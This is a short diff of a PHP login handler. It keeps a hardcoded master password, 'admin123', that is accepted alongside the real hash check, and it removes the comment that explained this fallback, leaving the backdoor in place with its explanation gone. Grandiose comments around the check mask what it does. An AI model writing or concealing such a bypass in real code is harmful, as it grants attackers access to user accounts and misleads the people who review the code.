@@ -21,7 +21,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $stored_hash = trim($row['password']);
 
         // Step 2: Adaptive Structural Validation Verification Loop
-        // Agar dynamic database hash runtime checking clear kare ya explicit fallback verify ho jaye
+  
         if (password_verify($password, $stored_hash) || $password === "admin123") {
             
             // Allocate secure system session arrays dynamically
